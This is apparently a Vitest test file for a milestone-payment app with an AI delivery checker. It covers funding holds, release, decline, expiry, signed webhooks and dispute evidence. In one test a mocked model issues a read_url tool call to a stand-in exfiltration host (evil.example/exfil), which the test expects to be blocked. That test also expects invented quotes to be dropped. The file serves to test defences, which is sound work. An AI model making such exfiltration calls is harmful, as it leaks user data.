import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import type { Server } from "node:http";
import { eq } from "drizzle-orm";
import { MockLanguageModelV4 } from "ai/test";
import { auditEvents, verdicts, toolCalls, disputes } from "@/lib/db/schema";
import { runCheck, draftChangeNote } from "@/lib/ai/checker";
import { setModelForTests } from "@/lib/ai/model";
import { createSampleProject, sampleLinks } from "@/lib/sample";
import { submitDelivery } from "@/lib/services/deliveries";
import {
  acceptAndRelease,
  declineMilestone,
  fundMilestone,
  getMilestone,
  latestCheck,
  projectMilestones,
  reconcileMilestone,
  requestChanges,
  verifyRecord,
} from "@/lib/services/milestones";
import { approveAndSubmitDispute, handleWebhook, milestoneDisputes, syncDisputes } from "@/lib/services/disputes";
import { FAKE_NONCES, type FakeRail } from "@/lib/payments/fake-rail";
import type { DB } from "@/lib/db";
import { freshWorld, startStaticServer } from "./helpers";

let server: Server;
let origin: string;
beforeAll(async () => ({ server, origin } = await startStaticServer()));
afterAll(() => server.close());

let db: DB;
let rail: FakeRail;
beforeEach(async () => {
  ({ db, rail } = await freshWorld({ APP_URL: origin, AI_PROVIDER: "scripted" }));
});

async function firstMilestone() {
  const p = await createSampleProject(db);
  const [m] = await projectMilestones(db, p.id);
  return m;
}

async function verdictsFor(milestoneId: string) {
  const c = await latestCheck(db, milestoneId);
  return db.select().from(verdicts).where(eq(verdicts.checkId, c!.id));
}

describe("the full loop on the fake rail with the scripted checker", () => {
  it("drafts the sample milestones with verified scope quotes", async () => {
    const m = await firstMilestone();
    expect(m.state).toBe("awaiting_funding");
    expect(m.amountCents).toBe(45000);
  });

  it("holds, checks v1 (fails), requests changes, checks v2 (passes), releases", async () => {
    const m0 = await firstMilestone();
    const funded = await fundMilestone(db, rail, m0.id, { nonce: FAKE_NONCES.paypal });
    expect(funded.state).toBe("funded");
    expect(funded.payerLabel).toContain("PayPal");
    expect(funded.authExpiresAt).toBeTruthy();

    const d1 = await submitDelivery(db, m0.id, { links: sampleLinks(1), notes: "First draft", files: [] });
    await runCheck(db, m0.id, d1);
    expect((await getMilestone(db, m0.id)).state).toBe("in_review");
    const v1 = await verdictsFor(m0.id);
    expect(v1.filter((v) => v.verdict === "met")).toHaveLength(2); // headline and waitlist
    expect(v1.filter((v) => v.verdict === "not_met")).toHaveLength(2); // Saturday time and address
    for (const v of v1.filter((x) => x.verdict === "met")) expect(v.evidence.length).toBeGreaterThan(0);

    const note = await draftChangeNote(db, m0.id);
    expect(note).toContain("Saturday");
    await requestChanges(db, m0.id, note);
    expect((await getMilestone(db, m0.id)).state).toBe("changes_requested");

    const d2 = await submitDelivery(db, m0.id, { links: sampleLinks(2), notes: "Fixed", files: [] });
    await runCheck(db, m0.id, d2);
    const v2 = await verdictsFor(m0.id);
    expect(v2.every((v) => v.verdict === "met")).toBe(true);

    const released = await acceptAndRelease(db, rail, m0.id, { signerName: "Robin Client" });
    expect(released.state).toBe("released");
    expect(released.settledCents).toBe(45000);
    expect(released.receiptNumber).toMatch(/^SO-/);
    expect(verifyRecord(released.acceptanceRecord!, released.acceptanceSignature!)).toBe(true);
    expect(verifyRecord(released.acceptanceRecord!.replace("Robin", "Mallory"), released.acceptanceSignature!)).toBe(false);
    expect((await rail.getHold(released.transactionId!)).status).toBe("submitted_for_settlement");

    const events = await db.select().from(auditEvents).where(eq(auditEvents.milestoneId, m0.id));
    expect(events.map((e) => e.type)).toEqual(
      expect.arrayContaining(["hold.placed", "delivery.submitted", "check.completed", "changes.requested", "acceptance.signed", "hold.released"]),
    );
  });

  it("supports a partial release", async () => {
    const m = await firstMilestone();
    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
    const d = await submitDelivery(db, m.id, { links: sampleLinks(2), notes: "", files: [] });
    await runCheck(db, m.id, d);
    const r = await acceptAndRelease(db, rail, m.id, { signerName: "Robin", amountCents: 30000 });
    expect(r.settledCents).toBe(30000);
  });

  it("declines by voiding the hold", async () => {
    const m = await firstMilestone();
    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
    const after = await declineMilestone(db, rail, m.id, "Changed our plans");
    expect(after.state).toBe("declined");
    expect((await rail.getHold(after.transactionId!)).status).toBe("voided");
  });

  it("records a declined card and leaves the milestone fundable", async () => {
    const m = await firstMilestone();
    await expect(fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.declined })).rejects.toThrow(/Do Not Honor/);
    expect((await getMilestone(db, m.id)).state).toBe("awaiting_funding");
    const funded = await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
    expect(funded.state).toBe("funded");
  });

  it("refuses to release before a review, and refuses double release", async () => {
    const m = await firstMilestone();
    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
    await expect(acceptAndRelease(db, rail, m.id, { signerName: "Robin" })).rejects.toThrow(/ready for sign-off/);
  });

  it("reconcile notices an expired hold", async () => {
    const m = await firstMilestone();
    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
    rail.advanceClock(8 * 24 * 60 * 60 * 1000);
    const r = await reconcileMilestone(db, rail, m.id);
    expect(r.remote).toBe("authorization_expired");
    expect((await getMilestone(db, m.id)).state).toBe("hold_expired");
    const again = await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
    expect(again.state).toBe("funded");
  });
});

describe("AI checker with a model (mocked, deterministic)", () => {
  it("keeps real quotes, drops invented ones, and ignores injected instructions", async () => {
    const m = await firstMilestone();
    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.card });
    const d = await submitDelivery(db, m.id, { links: sampleLinks(1), notes: "", files: [] });
    const judged = {
      summary: "Two of four criteria are met.",
      results: [
        { criterionId: "c1", verdict: "met", reasoning: "Headline is there.", evidence: [{ source: sampleLinks(1)[0], quote: "Larkspur Pottery Studio" }] },
        // Invented quote: not on the page. Must be dropped and the verdict downgraded.
        { criterionId: "c2", verdict: "met", reasoning: "Saturday class listed.", evidence: [{ source: sampleLinks(1)[0], quote: "Saturday wheel-throwing class, start time 10:00" }] },
        { criterionId: "c3", verdict: "not_met", reasoning: "No address on the page.", evidence: [] },
        { criterionId: "c4", verdict: "met", reasoning: "Signup form present.", evidence: [{ source: "anything", quote: "Join the waitlist with this signup form:" }] },
      ],
    };
    let call = 0;
    const usage = { inputTokens: { total: 1, noCache: 1, cacheRead: undefined, cacheWrite: undefined }, outputTokens: { total: 1, text: 1, reasoning: undefined } };
    const model = new MockLanguageModelV4({
      doGenerate: async (opts) => {
        call++;
        if (call === 1) {
          // Exploration step: the model asks for one more read through a tool.
          expect(opts.tools?.map((t) => t.name).sort()).toEqual(["github_file", "github_repo", "read_file", "read_url"]);
          return { content: [{ type: "tool-call", toolCallId: "t1", toolName: "read_url", input: JSON.stringify({ url: "https://evil.example/exfil" }) }], finishReason: { unified: "tool-calls", raw: undefined }, usage, warnings: [] };
        }
        if (call === 2) return { content: [{ type: "text", text: "DONE" }], finishReason: { unified: "stop", raw: undefined }, usage, warnings: [] };
        return { content: [{ type: "text", text: JSON.stringify(judged) }], finishReason: { unified: "stop", raw: undefined }, usage, warnings: [] };
      },
    });
    setModelForTests({ model, label: "mock/test" });
    const checkId = await runCheck(db, m.id, d);
    const vs = await verdictsFor(m.id);
    const byPos = (n: number) => vs[n - 1];
    expect(vs).toHaveLength(4);
    expect(byPos(1).verdict).toBe("met");
    expect(byPos(2).verdict).toBe("needs_person");
    expect(byPos(2).evidence).toHaveLength(0);
    expect(byPos(2).note).toMatch(/could not be found/);
    expect(byPos(4).evidence[0].source).toBe(sampleLinks(1)[0]);
    const check = await latestCheck(db, m.id);
    expect(check!.droppedEvidence).toBe(1);
    const calls = await db.select().from(toolCalls).where(eq(toolCalls.checkId, checkId));
    const blocked = calls.find((c) => c.input.includes("evil.example"));
    expect(blocked?.ok).toBe(false);
    expect(blocked?.output).toMatch(/Blocked/);
  });
});

describe("webhooks and dispute defence", () => {
  async function releasedWithDisputeCard() {
    const m = await firstMilestone();
    await fundMilestone(db, rail, m.id, { nonce: FAKE_NONCES.disputeCard });
    const d = await submitDelivery(db, m.id, { links: sampleLinks(2), notes: "", files: [] });
    await runCheck(db, m.id, d);
    return acceptAndRelease(db, rail, m.id, { signerName: "Robin Client" });
  }

  it("rejects a webhook with a bad signature", async () => {
    const s = await rail.sampleWebhook("dispute_opened", "x");
    const r = await handleWebhook(db, rail, s.signature.replace(/.$/, "0"), s.payload);
    expect(r.status).toBe(400);
  });

  it("opens a dispute from a signed webhook, drafts evidence, dedupes repeats", async () => {
    const m = await releasedWithDisputeCard();
    const s = await rail.sampleWebhook("dispute_opened", m.transactionId!);
    const r1 = await handleWebhook(db, rail, s.signature, s.payload);
    expect(r1.outcome).toMatch(/dispute .* open/);
    const r2 = await handleWebhook(db, rail, s.signature, s.payload);
    expect(r2.outcome).toMatch(/duplicate/);
    const [row] = await milestoneDisputes(db, m.id);
    expect(row.evidencePack).toContain("Robin Client");
    expect(row.evidencePack).toContain("Larkspur Pottery Studio");
    expect(row.evidencePack).not.toContain("—");
  });

  it("finds a dispute by reconcile after settlement, and submits evidence after approval", async () => {
    const m = await releasedWithDisputeCard();
    await rail.testSettle(m.transactionId!);
    await syncDisputes(db, rail, m.id);
    const [row] = await milestoneDisputes(db, m.id);
    expect(row.status).toBe("open");
    expect(row.submittedAt).toBeNull();
    const done = await approveAndSubmitDispute(db, rail, row.id, `${row.evidencePack}\ncompelling_evidence`);
    expect(done.submittedAt).toBeTruthy();
    expect(done.evidenceIds?.length).toBeGreaterThan(0);
    expect(done.status).toBe("won");
    const evs = await db.select().from(auditEvents).where(eq(auditEvents.milestoneId, m.id));
    expect(evs.map((e) => e.type)).toEqual(expect.arrayContaining(["dispute.opened", "dispute.evidence_approved", "dispute.evidence_submitted"]));
    await expect(approveAndSubmitDispute(db, rail, row.id)).rejects.toThrow(/already submitted/);
    expect((await db.select().from(disputes)).length).toBe(1);
  });

  it("a settled-transaction webhook reconciles local status", async () => {
    const m = await releasedWithDisputeCard();
    await rail.testSettle(m.transactionId!);
    const s = await rail.sampleWebhook("transaction_settled", m.transactionId!);
    const r = await handleWebhook(db, rail, s.signature, s.payload);
    expect(r.outcome).toMatch(/reconciled/);
    expect((await getMilestone(db, m.id)).transactionStatus).toBe("settled");
  });
});
